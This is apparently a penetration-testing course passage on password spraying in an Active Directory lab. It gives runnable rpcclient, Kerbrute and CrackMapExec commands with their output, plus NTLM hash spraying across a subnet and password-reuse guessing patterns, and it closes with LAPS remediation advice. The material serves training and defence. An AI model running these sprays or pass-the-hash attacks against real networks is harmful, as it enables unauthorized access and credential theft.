
Once a wordlist has been created using one of the methods shown previously, it is time to launch the attack.

`rpcclient` is an excellent option for performing password spraying from a Linux host.

> **Note**
> 
> A successful login is not immediately obvious with `rpcclient`. Instead, the presence of `Authority Name` in the output indicates a successful authentication.
> 
> Invalid login attempts can therefore be filtered out by grepping for `Authority`.

The following Bash one-liner (adapted from Black Hills InfoSec) can be used to perform the attack.

## Using a Bash One-liner for the Attack

```bash
for u in $(cat valid_users.txt); do
    rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority
done
```

### Example

```bash
LeDaav@htb[/htb]$ for u in $(cat valid_users.txt); do
    rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority
done

Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

---

We can also use **Kerbrute** to perform the same attack.

## Using Kerbrute for the Attack

```bash
LeDaav@htb[/htb]$ kerbrute passwordspray \
    -d inlanefreight.local \
    --dc 172.16.5.5 \
    valid_users.txt \
    Welcome1

     __             __
    / /_____  _____/ /_  _______  __/ /____
   / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
  / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
 /_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (9cfb81e) - Ronnie Flathers

Using KDC(s):
172.16.5.5:88

[+] VALID LOGIN: sgage@inlanefreight.local:Welcome1

Done! Tested 57 logins (1 success) in 0.172 seconds.
```

---

Another excellent option for password spraying from Linux is **CrackMapExec**.

The tool accepts a text file containing usernames and tests them against a single password. Using `grep +` filters out failed authentication attempts, allowing us to focus only on successful logins.

## Using CrackMapExec & Filtering Logon Failures

```bash
LeDaav@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 \
    -u valid_users.txt \
    -p Password123 | grep +

SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

---

After obtaining one or more successful hits, the credentials should be validated against the Domain Controller.

## Validating the Credentials with CrackMapExec

```bash
LeDaav@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 \
    -u avazquez \
    -p Password123

SMB 172.16.5.5 445 ACADEMY-EA-DC01 [*] Windows 10.0 Build 17763 x64
(name:ACADEMY-EA-DC01)
(domain:INLANEFREIGHT.LOCAL)
(signing:True)
(SMBv1:False)

SMB 172.16.5.5 445 ACADEMY-EA-DC01 [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

---

# Local Administrator Password Reuse

Internal password spraying is not limited to domain user accounts.

If administrative access is obtained and either the NTLM hash or the cleartext password of a local administrator account (or another privileged local account) is recovered, it can be tested across multiple hosts on the network.

Local administrator password reuse remains common due to:

- Gold images used during automated deployments.
    
- Administrative convenience.
    
- Legacy operational practices.
    

---

## High-Value Targets

This attack is especially effective against high-value systems such as:

- SQL Servers
    
- Microsoft Exchange Servers
    
- Application Servers
    
- Critical Infrastructure Hosts
    

These systems are more likely to have privileged users logged in or credentials resident in memory.

---

## Password Reuse Patterns

When dealing with local administrator accounts, it is important to look for password reuse patterns.

For example, if a workstation uses:

```text
$desktop%@admin123
```

it may be worth testing:

```text
$server%@admin123
```

against server hosts.

Similarly, if a non-standard local administrator account such as:

```text
bsmith
```

is discovered, the same password may also be valid for the corresponding domain account.

The same principle applies to administrative domain accounts:

```text
ajones
```

↓

```text
ajones_adm
```

Password reuse across trusted domains is also frequently encountered during internal assessments.

---

## Spraying an NTLM Hash

In some situations, only the NTLM hash of the local administrator account can be extracted from the local SAM database.

The hash can then be sprayed across an entire subnet to identify systems that share the same local administrator password.

The `--local-auth` option is critical in this scenario.

It instructs CrackMapExec to authenticate only against local accounts, preventing authentication attempts against Active Directory and significantly reducing the risk of account lockouts.

> **Warning**
> 
> Always use the `--local-auth` flag when performing local administrator password spraying.
> 
> Without it, CrackMapExec will attempt domain authentication by default, potentially causing account lockouts.

## Local Admin Spraying with CrackMapExec

```bash
LeDaav@htb[/htb]$ sudo crackmapexec smb \
    --local-auth \
    172.16.5.0/23 \
    -u administrator \
    -H 88ad09182de639ccc6579eb0849751cf | grep +

SMB 172.16.5.50  445 ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator (Pwn3d!)
SMB 172.16.5.25  445 ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator (Pwn3d!)
SMB 172.16.5.125 445 ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator (Pwn3d!)
```

The output above shows that the recovered local administrator hash is valid on **three systems** within the `172.16.5.0/23` subnet.

These hosts can then be further enumerated to identify additional opportunities for lateral movement or privilege escalation.

---

# Remediation

Although highly effective, this technique is extremely **noisy** and should not be used during engagements requiring stealth.

Nevertheless, local administrator password reuse is a widespread security weakness and should always be identified and reported during penetration tests.

The recommended mitigation is **Microsoft LAPS (Local Administrator Password Solution)**, which:

- Assigns a unique local administrator password to every host.
    
- Stores the password securely in Active Directory.
    
- Automatically rotates passwords according to a defined policy.
    

This effectively eliminates the risk associated with local administrator password reuse.